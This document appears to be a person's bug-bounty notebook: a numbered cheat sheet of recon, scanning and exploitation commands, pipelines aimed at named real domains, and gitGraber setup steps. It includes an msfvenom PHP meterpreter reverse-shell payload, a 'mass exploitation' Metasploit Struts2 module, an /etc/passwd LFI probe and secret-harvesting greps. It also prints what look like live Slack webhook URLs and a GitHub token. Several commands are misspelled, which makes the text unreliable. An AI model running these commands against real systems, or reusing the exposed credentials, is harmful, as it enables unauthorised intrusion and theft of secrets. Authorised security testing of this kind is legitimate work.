```
#1  subdomain enumeration
subfinder -d target.com -o s1.txt

amass enum -passive -f target.com -o s2.txt

assetfinder --subs-only target.com | tee s3.txt

#2 scanning 

masscan : masscan -p1-65535 --rate 10000 -oL masscan.txt target.com
nmap  : nmap -p- --open -sV -sC -T4 -oN nmap.txt target.com

#3 Screenshot capturing for subdomains

Eyewitness : eyewitness -f subs.txt --web

aquatone : cat subs.txt | aquatone -out  Screenshot 

#4  Directory bruteforcing

ffuf :  ffuf -u "https://example.com/FUZZ" -w <wordslist> -o ffuf.txt

gobuster:gobuster dir -u <url> -w -o gobuster.txt

 #5 js analysis

 linkfinder :  python3 linkfinder.py -i <url> -o results.html
 gf : cat js_files.txt | gf apikeys | tee secrets.txt

 #6 parameter discovery

 paramspider : python3 paramspider.py -d target.txt --level high -o params.txt
 arjun:  arjun -u https://target.com/api -m GET -o params.json

 #7 XSS Detection

 dalfox :  cat params.txt | dalfox pipe -o xss.txt
 xsstrike : python3 xsstrike/xsstrike.py -u "https://target.com/index.php?search=query"


#8 Sql injection Dectection

sqlmap -u "url" --dbs --batch --random-agent

 #9 SSRF

gopherus : python3 gopherus.py
interact.sh : interactsh-client -v

#10 LFI & RFI Detection

LFISUIT : python3 lfisuite.py -u "https://target.com/index.php?file=../../../etc/passwd"

FIMap : fimap -u "https://target.com/index.php?file=test"


#11 open redirect 

oralyzer : python3 oralyzer.py -l urls.txt -p payload.txt


#12 security headers check 

nikto : nikto -h target.com
httpx-toolkit : httpx -u target.com -sc -title -server -o headers.txt

#13 API recon

postman :

kiterunner :  kiterunner -u https://target.com -w wordslist/api.txt

#14 Content Discovery

gau: gau target.com | tee urls.txt

waybackurls :  waybackurls target.com | tee wb

screaming frog :

waybackmachine : 

commoncrawl : 

aleanvault otx/otx-node-SDK

#15 s3 bucket enumeration


aws bucket dump : python3 awsbuxketdump.py -l target-buckets.txt -D


#16 CMS ENUMERATRION

CMSeek :  python3 cmseek.py -u target.com

#17 waf dectection

waf00f : waf00f https://target.com

#18 information dislcoure dectection 

git-dumper.py : python3 git-dumper.py https://target.com/.git /output-floder/

#19 reverse shell generation

msfvenom

msfveom -p php/meterptreter/reverse_tcp LHOST=yourip LPORT=4444 -f raw > shell.php

#20 Mass Exploitation with metasploit

 
 msfconsole

 use exploit/multi/http/structs2_namespace_ognl 
```


```
cat > taregts.txt


subfinder -dL targets.txt   | /usr/local/bin/httpx | tee subs.txt ; sleep 5000 ; cat subs.txt | waybackurls --no-subs | /usr/local/bin/httpx  | tee wb


subfinder  -d newegg.ca  | /usr/local/bin/httpx | tee subs.txt ; sleep 5000 ; cat subs.txt | waybackurls --no-subs | /usr/local/bin/httpx  | tee wb


subfinder -dL targets.txt | httpx -mc 200 | tee httpx200.txt

subfinder -d target.com | /usr/local/bin/httpx | tee subs.txt

1.1
1. subfinder -dL target.txt | httpx -mc 200 | tee subs.txt
2. cat subs.txt | waybackurls | httpx -mc 200 | tee wb.txt
3. cat wb.txt | grep keywords = api , access , env  , /user/ /user , /api 


1.2 

cat wb.txt | grep .js | tee js.txt

nuclei -l js.txt -t /root/nuclei-templates/http/exposures

go install github.com/tomnomnom/waybackurls@latest


1.3

echo weather.com | waybackurls --no-subs | httpx -mc 200 | tee js.txt

nuclei -l js.txt -t /root/nuclei-templates/http/exposures



CA.gov

1. subfinder -dL target.txt | httpx -mc 200 | tee subs.txt
2. cat subs.txt | waybackurls | httpx -mc 200 | tee wb.txt
3. cat wb.txt | grep keywords = api , access , env  , /user/ /user , /api



CA.gov

subfinder -d ca.gov | httpx -mc 200,403 | tee target.txt
subfinder -dL target.txt | httpx -mc 200,403 | tee target2.txt
cat target2.txt | waybackurls | httpx -mc 200 | tee wb.txt

subfinder -d celo.org | /usr/local/bin/httpx | tee subs.txt ; sleep 5000 ; cat subs.txt | waybackurls --no-subs | /usr/local/bin/httpx  | tee wb

1. cat wayback.txt | httpx -mc 200 | grep config.js | slackcat -1 https://hooks.slack.com/services/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


2. cat wayback.txt | grep .js | tee js.txt 

config


nuclei -l js.txt -t /root/nuclei-templates/http/exposures | slackcat -1 https://hooks.slack.com/services/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
```


```
Automation for BB

If you have go1.13+ compiler installed: 
 Run follwing commands
 
go get github.com/dwisiswant0/slackcat

sudo apt-get install python3-pip

pip3 install -r requirements.txt




Clone this repo in your linux based machine or vps


1. git clone https://github.com/hisxo/gitGraber/

2. Create account on slack.com then go to https://api.slack.com/apps?new_app=1

3. Create new app with any name 

4. IN left side click on "Incoming Webhooks"

5. Activate Incoming Webhooks  : It is off now make it on

6. Click Add New Webhook to Workspace.

7. Select any chanel to post alerts

8. Copy webhook URL (mine https://hooks.slack.com/services/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)

9. Now go to https://github.com/settings/tokens

10. Genrate new token : my token e92d320d803f6e07b64f63e540ade0668150286c


=====================================================================================================

11. Navigate to your tool path and edit config.py

12. Add your github token GITHUB_TOKENS = ['X', 'X', 'X', 'X', 'X']
e92d320d803f6e07b64f63e540ade0668150286c

It will look like this

GITHUB_TOKENS = ['e92d320d803f6e07b64f63e540ade0668150286c','e92d320d803f6e07b64f63e540ade0668150286c','e92d320d803f6e07b64f63e540ade0668150286c','e92d320d803f6e07b64f63e540ade0668150286c','e92d320d803f6e07b64f63e540ade0668150286c']

13. Add SLACK_WEBHOOK_URL=

SLACK_WEBHOOKURL = 'https://hooks.slack.com/services/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'

14. Press Cntrl + X , TYpe "Y" hit enter



Set
Now run tool


python3 gitGraber.py -q oracle.com -s
```
